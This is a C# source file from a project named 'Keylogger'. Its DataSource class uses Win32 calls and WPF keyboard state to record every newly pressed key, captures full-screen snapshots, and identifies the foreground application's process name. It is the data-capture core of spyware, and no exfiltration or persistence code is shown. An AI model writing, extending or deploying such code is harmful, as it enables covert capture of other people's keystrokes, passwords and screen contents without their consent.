using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;

namespace Keylogger
{
    public class DataSource
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
        
        private HashSet<Key> PressedKeys = new HashSet<Key>();




        public List<Key> GetNewPressedKeys()
        {
            List<Key> newPressedKeys = new List<Key>(10);

            foreach (Key key in Utils.GetEnumValues<Key>().Where(x => x != Key.None))
            {
                bool down = Keyboard.IsKeyDown(key);

                if (!down && PressedKeys.Contains(key))
                    PressedKeys.Remove(key);
                else if (down && !PressedKeys.Contains(key))
                {
                    PressedKeys.Add(key);
                    newPressedKeys.Add(key);
                }
            }

            return newPressedKeys;
        }
        public Bitmap GetScreenSnapshot()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);

            return bitmap;
        }
        public string GetActiveWindowProcessName()
        {
            IntPtr windowHandle = GetForegroundWindow();
            GetWindowThreadProcessId(windowHandle, out uint processId);
            Process process = Process.GetProcessById((int)processId);

            return process.ProcessName;
        }
    }
}
